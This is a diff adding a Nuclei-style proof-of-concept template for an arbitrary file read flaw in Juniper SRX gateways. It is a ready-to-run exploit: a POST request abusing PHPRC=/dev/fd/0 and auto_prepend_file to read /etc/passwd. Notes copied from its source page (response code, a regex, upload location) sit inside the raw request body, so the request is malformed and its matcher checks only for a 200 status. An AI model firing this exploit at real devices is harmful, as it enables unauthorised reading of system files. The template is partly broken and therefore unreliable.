@@ -1,0 +1,51 @@
+id: poc-ighay5mxbc3tw1ll
+info:
+  name: Juniper SRX 系列服务网关任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ighay5mxbc3tw1ll'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ighay5mxbc3tw1ll
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /?PHPRC=/dev/fd/0 HTTP/1.1
+
+
+    Accept: */*
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+    Connection: close
+
+
+
+
+    auto_prepend_file="/etc/passwd"
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?root)(?=.*?bin).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
